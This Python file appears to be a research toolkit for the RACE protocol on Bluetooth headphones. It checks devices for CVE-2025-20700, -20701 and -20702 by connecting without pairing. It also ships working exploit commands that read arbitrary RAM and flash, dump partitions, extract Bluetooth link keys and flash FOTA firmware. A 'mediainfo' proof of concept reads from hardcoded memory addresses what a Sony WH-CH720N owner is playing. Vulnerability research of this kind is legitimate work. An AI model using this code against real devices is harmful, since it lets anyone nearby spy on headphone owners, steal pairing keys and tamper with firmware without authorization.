import sys
import struct
import logging
import asyncio
import argparse

from dataclasses import dataclass
from enum import Enum, auto

from hexdump2 import hexdump

from bumble.colors import color

from librace.constants import RaceType
from librace.fota import FOTAUpdater
from librace.packets import (
    GetLinkKeyResponse,
    RaceHeader,
    RacePacket,
    GetLinkKey,
    GetSDKInfo,
    BuildVersion,
    GetEDRAddress,
    GetEDRAddressResponse,
)
from librace.transport import (
    GATTBumbleChecker,
    GATTBleakTransport,
    GATTBumbleTransport,
    RFCOMMBumbleChecker,
    RFCOMMTransport,
    USBHIDTransport,
)
from librace.race import RACE
from librace.dumper import (
    RACEDumper,
    RACEFlashDumper,
    RACERAMDumper,
)
from librace.util import setup_logging
from librace.parttable import parse_partition_table


def parse_args():
    parser = argparse.ArgumentParser(description="RACE Toolkit")
    parser.add_argument(
        "-t",
        "--transport",
        choices=["gatt", "bleak", "rfcomm", "usb"],
        default="gatt",
        help="Transport method (default: gatt)",
    )
    parser.add_argument(
        "--target-address", help="Target device Bluetooth classic address to connect to"
    )
    parser.add_argument(
        "--le-names",
        default=None,
        nargs="+",
        help="List of names to scan for if no address is given",
    )
    parser.add_argument(
        "-c",
        "--controller",
        default="usb:0",
        help="Bumble Bluetooth Controller (Required for RFCOMM, default: usb:0)",
    )
    parser.add_argument(
        "-d",
        "--device",
        default=None,
        help="USB device for USBHID transport. Given as VID:PID pair. By default the transport enumerates all devices and lets you choose.",
    )
    parser.add_argument(
        "--outfile", help="Output file for commands with output (default is stdout)."
    )
    parser.add_argument("--debug", action="store_true", help="Enable debug logging.")
    parser.add_argument(
        "--send-delay",
        type=float,
        default=0.0,
        help="Introduces a send delay between RACE messages. Might be required for old SDK versions?",
    )
    parser.add_argument(
        "--authenticate",
        action="store_true",
        help="Try to authenticate/pair during connection. Required for devices with pairing issues fixed. Put device into pairing mode and connect with this parameter. Ideally, this only needs to be done once.",
    )

    subparsers = parser.add_subparsers(dest="command", required=True)

    # Check subcommand
    subparsers.add_parser(
        "check",
        help="Check for RACE vulnerabilities (CVE-2025-20700, CVE-2025-20701, CVE-2025-20702).",
    )

    # RAM subcommand
    ram_parser = subparsers.add_parser("ram", help="Read RAM memory")
    ram_parser.add_argument(
        "--address",
        type=lambda x: int(x, 16),
        required=True,
        help="Target address (hex parsed to int)",
    )
    ram_parser.add_argument(
        "--size",
        type=lambda x: int(x, 16),
        required=True,
        help="Number of bytes to dump (must be a multiple of 4)",
    )

    # Flash subcommand
    flash_parser = subparsers.add_parser("flash", help="Dump Flash memory")
    flash_parser.add_argument(
        "--address",
        type=lambda x: int(x, 16),
        required=True,
        help="Start address (hex parsed to int, must be a multiple of 0x100)",
    )
    flash_parser.add_argument(
        "--size",
        type=lambda x: int(x, 16),
        required=True,
        help="Number of bytes to dump (must be a multiple of 0x100)",
    )

    # Link-keys subcommand
    subparsers.add_parser(
        "link-keys", help="RACE Get Link Key Command (Will not work on many devices)"
    )

    # BD addr subcommand
    subparsers.add_parser("bdaddr", help="RACE Get Bluetooth Address Command")

    # SDK info subcommand
    subparsers.add_parser("sdkinfo", help="RACE Get SDK Information Command")

    # Build version subcommand
    subparsers.add_parser("buildversion", help="RACE Build Version Command")

    # Mediainfo subcommand
    subparsers.add_parser(
        "mediainfo",
        help="Dump Current Listening Media Info. This is a proof-of-concept. Only works on some FW versions of Sony WH-CH720N.",
    )

    # Raw subcommand
    raw_parser = subparsers.add_parser(
        "raw", help="Send simple RACE packet with specified ID"
    )
    raw_parser.add_argument(
        "--id",
        type=lambda x: int(x, 16),
        required=True,
        help="ID of RACE command to send",
    )

    # Dump partition subcommand
    subparsers.add_parser(
        "dump-partition", help="Interactively choose and dump a partition"
    )

    # FOTA Update subcommand
    fota_parser = subparsers.add_parser("fota", help="FOTA update")
    fota_parser.add_argument("--fota-file", help="The FOTA file")
    fota_parser.add_argument(
        "--dont-reflash",
        action="store_true",
        default=False,
        help="Prevent FOTA partition from being erased and reflashed. This is mainly to retry the currently flashed FOTA update,",
    )
    fota_parser.add_argument(
        "--chunks-per-write",
        type=int,
        default=3,
        help="How many chunks should be written in one flash write. Experiments show 3 works best. Larger numbers might not be possible.",
    )

    return parser.parse_args()


def init_transport(args: argparse.Namespace):
    if args.transport.lower() == "rfcomm":
        if args.target_address is None:
            raise ValueError("RFCOMM transport needs --target-address!")
        return RFCOMMTransport(args.controller, args.target_address, args.authenticate)
    elif args.transport.lower() == "bleak":
        return GATTBleakTransport(args.target_address, args.le_names)
    elif args.transport.lower() == "gatt":
        return GATTBumbleTransport(
            args.controller, args.target_address, args.le_names, args.authenticate
        )
    elif args.transport.lower() == "usb":
        return USBHIDTransport(args.device)


class VulnerabilityStatus(Enum):
    UNKNOWN = auto()
    FIXED = auto()
    VULNERABLE = auto()
    NOT_APPLICABLE = auto()


@dataclass
class Vulnerability:
    id: str
    description: str
    status: VulnerabilityStatus = VulnerabilityStatus.UNKNOWN


async def command_check(args: argparse.Namespace):
    vulnerabilities = [
        Vulnerability("CVE-2025-20700", "Missing GATT authentication"),
        Vulnerability("CVE-2025-20701", "Missing BR/EDR authentication"),
        Vulnerability("CVE-2025-20702_LE", "RACE Protocol via BLE"),
        Vulnerability("CVE-2025-20702_BR_EDR", "RACE Protocol via Bluetooth Classic"),
    ]

    logging.info(color("Starting device check.", "red"))
    logging.info(color("Step 1: Scanning Bluetooth Low Energy devices.", "cyan"))
    logging.info("Scanning for 5 seconds...")
    bdaddr = args.target_address

    # Step 1: BLE Checks.
    # - first check if the device is available via BLE
    # - then check for UUIDs that we know about
    # - lasty, connect to the device and try the following
    #   - read from flash
    #   - get bdaddr for Classic checks
    le_checker = GATTBumbleChecker(args.controller, args.target_address)
    await le_checker.setup(None)
    scan_res = await le_checker.scan_devices()
    if scan_res:
        addr, dev_name = scan_res
        logging.info(
            f"Your device is {dev_name} ({addr}). Trying to identify RACE UUIDs via GATT."
        )
        if await le_checker.check_UUIDs(addr):
            v = next((v for v in vulnerabilities if v.id == "CVE-2025-20700"), None)
            v.status = VulnerabilityStatus.VULNERABLE

            logging.info(f"Initiating a proper BLE connection to {dev_name} on {addr}.")
            le_transport = GATTBumbleTransport(args.controller, addr, [], False)
            le_transport.connection = le_checker.connection
            le_transport.device = le_checker.device
            await le_transport.setup_gatt(None)
            r = RACE(le_transport, args.send_delay)
            logging.info("Trying to read flash via BLE.")
            d = RACEFlashDumper(r, 0x08000000, 0x1000)
            # try to dump with a 10-second timeout
            status = VulnerabilityStatus.FIXED
            try:
                await asyncio.wait_for(d.dump(), 10.0)
                status = VulnerabilityStatus.VULNERABLE
            except asyncio.TimeoutError:
                logging.warning(
                    "Timeout! Unable to dump flash within 10 seconds. Device might be fixed!"
                )
            except Exception as e:
                logging.warning(
                    f"Unable to dump flash. Device might be fixed! Error is {e}"
                )
            v = next((v for v in vulnerabilities if v.id == "CVE-2025-20702_LE"), None)
            v.status = status

            r = RACE(le_transport, args.send_delay)
            await r.setup()
            if not bdaddr:
                try:
                    logging.info(
                        "Trying to obtain the Bluetooth Classic address for next step."
                    )
                    await asyncio.wait_for(r.send_sync(GetEDRAddress()), 8.0)
                    bdaddr = GetEDRAddressResponse.unpack(r.sync_payload).bd_addr
                    bdaddr = ":".join(f"{byte:02X}" for byte in bdaddr)
                    logging.info(
                        color(f"Got Bluetooth Classic address {bdaddr}", "cyan")
                    )
                except asyncio.TimeoutError:
                    logging.warning(
                        "Timeout! Unable to retrieve Bluetooth Classic address within 8 seconds. The RACE command might be unavailable, which is expected for many devices."
                    )
                except Exception as e:
                    logging.warning(f"Error receiving BD addr: {e}.")

            await le_transport.close()
            await le_checker.close()
    else:
        logging.info(
            color(
                "The device does not seem to be available via BLE. It is probably not vulnerable to CVE-2025-20700! You could try again to be sure.",
                "cyan",
            )
        )
        v = next((v for v in vulnerabilities if v.id == "CVE-2025-20700"), None)
        v.status = VulnerabilityStatus.NOT_APPLICABLE
        v = next((v for v in vulnerabilities if v.id == "CVE-2025-20702_LE"), None)
        v.status = VulnerabilityStatus.NOT_APPLICABLE
        await le_checker.close()

    # Step 2: Classic Checks.
    # - if we have a BD addr supplied by user or retrieved via RACE we will take it
    # - if not, we ask the user one more time
    # - if we have the address:
    #   - enumerate RFCOMM services and look for known UUIDs
    #   - try to read flash via RFCOMM
    logging.info(color("Step 2: Checking Bluetooth Classic connection", "cyan"))
    if not bdaddr:
        logging.error(
            "Now I need a Bluetooth address. If you have it, please supply it now: "
        )
        bdaddr = input()
    classic_checker = RFCOMMBumbleChecker(args.controller, bdaddr, False)
    await classic_checker.setup()
    logging.info("Trying to find RACE SSP RFCOMM UUID.")

    check_classic = True
    try:
        uuid = await classic_checker.check_UUIDs()
    except Exception as e:
        logging.error(f"Unable to create a Bluetooth Classic connection. Error: {e}")
        logging.error("Skipping the rest of Bluetooth Classic checks!")
        check_classic = False

    if check_classic:
        logging.info(
            "Checking Bluetooth Classic Pairing Issue by initiating an HfP connection."
        )
        auth_check = await classic_checker.check_auth_vuln()
        if auth_check:
            logging.info("Connection was successful without pairing!")
            v = next((v for v in vulnerabilities if v.id == "CVE-2025-20701"), None)
            v.status = VulnerabilityStatus.VULNERABLE
        else:
            logging.info("Connection without pairing was not successful.")
            v = next((v for v in vulnerabilities if v.id == "CVE-2025-20701"), None)
            v.status = VulnerabilityStatus.FIXED

        if uuid:
            logging.info("Trying to connect to RFCOMM RACE interface.")
            await classic_checker.close()

            rfcomm = RFCOMMTransport(args.controller, bdaddr, False, uuid=uuid)

            try:
                r = RACE(rfcomm, args.send_delay)
                await r.setup()

                logging.info("Trying to read flash via Bluetooth Classic.")
                d = RACEFlashDumper(r, 0x08000000, 0x1000)
                # try to dump with a 10-second timeout
                status = VulnerabilityStatus.FIXED
                try:
                    await asyncio.wait_for(d.dump(), 10.0)
                    status = VulnerabilityStatus.VULNERABLE
                    # There might be the rare case that HfP is not possible without pairing, but RACE is? Then we still consider it vulnerable!
                    v = next(
                        (v for v in vulnerabilities if v.id == "CVE-2025-20701"), None
                    )
                    v.status = status
                except asyncio.TimeoutError:
                    logging.warning(
                        "Timeout! Unable to dump flash within 10 seconds. Device might be fixed!"
                    )
                except Exception as e:
                    logging.warning(
                        f"Unable to dump flash. Device might be fixed! Error is {e}"
                    )
                v = next(
                    (v for v in vulnerabilities if v.id == "CVE-2025-20702_BR_EDR"),
                    None,
                )
                v.status = status
                await rfcomm.close()
            except asyncio.CancelledError as e:
                logging.warning(
                    f"Error connecting to device via RACE over RFCOMM ({e})."
                )
                v = next(
                    (v for v in vulnerabilities if v.id == "CVE-2025-20702_BR_EDR"),
                    None,
                )
                v.status = VulnerabilityStatus.FIXED

        else:
            logging.warning("The device might not expose RACE via Bluetooth Classic!")
            v = next(
                (v for v in vulnerabilities if v.id == "CVE-2025-20702_BR_EDR"), None
            )
            v.status = VulnerabilityStatus.FIXED

    logging.info("Vulnerability status summary:")
    for v in vulnerabilities:
        logging.info(f"  [{v.status.name:<10}] {v.id}: {v.description}")


async def command_ram(r: RACE, address: int, size: int, outfile: str, debug: bool):
    if size % 0x4 != 0:
        logging.error(
            "Error! Address needs to be a multiple of 0x4 to be page-aligned!"
        )
        sys.exit()

    dumper = RACERAMDumper(r, address, size, progress=not debug)
    if outfile:
        with open(outfile, "wb") as f:
            await dumper.dump(fd=f)
    else:
        outbuf = await dumper.dump()
        hexdump(outbuf)


async def command_flash(r: RACE, address: int, size: int, outfile: str, debug: bool):
    if size % 0x100 != 0 or address % 0x100 != 0:
        logging.error(
            "Error! Address and size need to be multiples of 0x100 to be page-aligned!"
        )
        sys.exit()

    dumper = RACEFlashDumper(r, address, size, progress=not debug)
    if outfile:
        with open(outfile, "wb") as f:
            await dumper.dump(fd=f)
    else:
        outbuf = await dumper.dump()
        hexdump(outbuf)


async def command_link_keys(r: RACE, outfile: str):
    logging.info("Sending get link key request")
    await r.setup()
    p = GetLinkKey()
    res = await r.send_sync(p)
    pkt = GetLinkKeyResponse.unpack(res)
    logging.info("Got link key response")

    if outfile:
        with open(outfile, "wb") as f:
            f.write(pkt.payload)
    else:
        logging.info(f"Found {pkt.num_of_devices} link keys:")
        for i, key in enumerate(pkt.link_keys):
            logging.info(f"{i}: {key.hex()}")


async def command_bdaddr(r: RACE, outfile: str):
    logging.info("Sending get Bluetooth address request")
    await r.setup()
    p = GetEDRAddress()
    res = await r.send_sync(p)
    addr_pkt = GetEDRAddressResponse.unpack(res)
    logging.info("Got Bluetooth address response")

    if outfile:
        with open(outfile, "wb") as f:
            f.write(res)
    else:
        formatted_address = ":".join(f"{byte:02X}" for byte in addr_pkt.bd_addr)
        logging.info(formatted_address)


async def command_raw(r: RACE, id: int, outfile: str):
    logging.info("Sending raw RACE command")
    await r.setup()
    race_header = RaceHeader(head=0x5, type_=RaceType.CMD_EXPECTS_RESPONSE, id_=id)
    p = RacePacket(race_header)
    res = await r.send_sync(p)

    logging.info("Got response")

    if outfile:
        with open(outfile, "wb") as f:
            f.write(res)
    else:
        hexdump(res)


async def command_sdkinfo(r: RACE, outfile: str):
    logging.info("Sending get SDK info request")
    await r.setup()
    p = GetSDKInfo()
    res = await r.send_sync(p)
    logging.info("Got SDK info response")

    if outfile:
        with open(outfile, "wb") as f:
            f.write(res)
    else:
        logging.info(res[7:].decode("utf8"))


async def _get_buildversion(r: RACE):
    await r.setup()
    p = BuildVersion()
    return await r.send_sync(p)


async def command_buildversion(r: RACE, outfile: str):
    logging.info("Sending get build version request")
    res = await _get_buildversion(r)
    logging.info("Got build version response")

    if outfile:
        with open(outfile, "wb") as f:
            f.write(res)
    else:
        logging.info(res[7:].decode("utf8"))


async def _read_media_attr(d: RACEDumper, addr: str):
    ptr = await d.dump(addr, 0x4)
    ptr = struct.unpack("<I", ptr)[0]
    return (await d.dump(ptr, 0x40)).decode("utf8")


async def command_mediainfo(r: RACE):
    logging.info(
        "Trying to dump current playing media info. Identifying model and firmware version first..."
    )
    bv = await _get_buildversion(r)
    bv = bv[7:].replace(b"\x00", b"").decode("ascii")
    logging.info(f"Got buildversion `{bv}`.")

    dumper = RACERAMDumper(r, 0, 0, progress=False)
    # We only do this for device that we know and where can get the buildversion.
    # Currently this is Sony CH-WH720n in version 1.0.8, 1.0.9, and 1.1.0
    if (
        bv
        == "mt2822x_evkMT2822_SDK_Sony-ER69_mdr14_c42sp_12023/01/12 19:15:56 GMT +08:00"
    ):  # v1.0.8
        t = await _read_media_attr(dumper, 0x14238C9C)
        al = await _read_media_attr(dumper, 0x14238CA4)
        ar = await _read_media_attr(dumper, 0x14238C8C)
        gen = await _read_media_attr(dumper, 0x14238CA8)
        logging.info("Your target is currently listening to:")
        logging.info(f"\tTrack: {t}")
        logging.info(f"\tAlbum: {al}")
        logging.info(f"\tArtist: {ar}")
        logging.info(f"\tGenre: {gen}")
    elif (
        bv
        == "mt2822x_evkMT2822_SDK_Sony-ER69_mdr14_c42sp_12024/09/18 18:58:55 GMT +08:00"
    ):  # v1.1.0
        t = await _read_media_attr(dumper, 0x14238C98)
        al = await _read_media_attr(dumper, 0x14238CA0)
        ar = await _read_media_attr(dumper, 0x14238C88)
        gen = await _read_media_attr(dumper, 0x14238CA4)
        logging.info("Your target is currently listening to:")
        logging.info(f"\tTrack: {t}")
        logging.info(f"\tAlbum: {al}")
        logging.info(f"\tArtist: {ar}")
        logging.info(f"\tGenre: {gen}")
    elif (
        bv
        == "mt2822x_evkMT2822_SDK_Sony-ER69_mdr14_c42sp_12024/06/28 13:44:31 GMT +08:00"
    ):  # v1.0.9
        # each field is prepended with 0x02 0xLL where LL is the length of the string
        # but to be faster we just dump 0x100 bytes and do the parsing afterwards, hoping we
        # dumped enough
        data = await dumper.dump(0x14238DB0, 0x100)
        parts = data.split(b"\x02")[1:5]
        m = ["Track", "Album", "Artist", "Genre"]
        logging.info("Your target is currently listening to:")
        for i, part in enumerate(parts):
            plen = part[0]
            logging.info(f"\t{m[i]}: {part[1 : plen + 1].decode('utf8')}")
            if len(part) > plen + 1 and part[plen + 1] == 0x01:
                break
    else:
        logging.error(
            "Sorry, we don't know this buildversion. We don't support unknown versions."
        )


async def command_dump_partition(r: RACE, outfile: str):
    # dumping a whole partion to stdout is kinda stupid, so lets not do it
    if not outfile:
        logging.error("Please specify an outfile to dump the NVDM partition to.")
        sys.exit(1)

    logging.info("Reading partition table:")
    pt_dumper = RACEFlashDumper(r, 0x0, 0x1000)
    pt = await pt_dumper.dump()

    partitions = parse_partition_table(pt)
    logging.info("\nPartition Table")
    logging.info("===================")
    for idx, (addr, size, ptype) in enumerate(partitions):
        logging.info(
            f"Partition {idx:2}: Address = 0x{addr:08X}, Length = 0x{size:08X}, Type = {ptype}"
        )
    logging.info("\n\x1b[3mHint: The NVDM partition is usually in partition 6\x1b[0m\n")

    chosen = -1
    while chosen >= len(partitions) or chosen < 0:
        chosen = int(input("Which partition would you like to dump?\n"))

    ptaddr, ptsize, _ = partitions[chosen]
    logging.info(f"Dumping partion {chosen} at 0x{ptaddr:08X}")

    dumper = RACEFlashDumper(r, ptaddr, ptsize)
    if outfile:
        with open(outfile, "wb") as f:
            await dumper.dump(fd=f)
    else:
        outbuf = await dumper.dump()
        hexdump(outbuf)


async def command_fota(
    r: RACE, fota_file: str, dont_reflash: bool, chunks_per_write: int
):
    f = FOTAUpdater(r, chunks_per_write)
    if fota_file is None and dont_reflash is False:
        logging.error(
            color("Error! FOTA File is required when --dont-reflash is not set!", "red")
        )
        return
    # Invert the dont_reflash flag so that it's clearer in the FOTA updater class
    await f.update(fota_file, not dont_reflash)


async def main():
    # Parse arguments and commands
    args = parse_args()

    setup_logging(args.debug)

    # In the 'check' command we initialize the transport separately
    if args.command == "check":
        await command_check(args)
    else:
        # Initialize the transport class based on the given technology and target UUIDs
        try:
            transport = init_transport(args)
        except ValueError as e:
            logging.error(
                color(f"Error! Transport could not be initialized:\n{e}", "red")
            )
            return
        try:
            r = RACE(transport, args.send_delay)
            if args.command == "ram":
                await command_ram(r, args.address, args.size, args.outfile, args.debug)
            elif args.command == "raw":
                await command_raw(r, args.id, args.outfile)
            elif args.command == "flash":
                await command_flash(
                    r, args.address, args.size, args.outfile, args.debug
                )
            elif args.command == "link-keys":
                await command_link_keys(r, args.outfile)
            elif args.command == "bdaddr":
                await command_bdaddr(r, args.outfile)
            elif args.command == "sdkinfo":
                await command_sdkinfo(r, args.outfile)
            elif args.command == "buildversion":
                await command_buildversion(r, args.outfile)
            elif args.command == "mediainfo":
                await command_mediainfo(r)
            elif args.command == "dump-partition":
                await command_dump_partition(r, args.outfile)
            elif args.command == "fota":
                await command_fota(
                    r, args.fota_file, args.dont_reflash, args.chunks_per_write
                )
        finally:
            await r.close()


if __name__ == "__main__":
    asyncio.run(main())
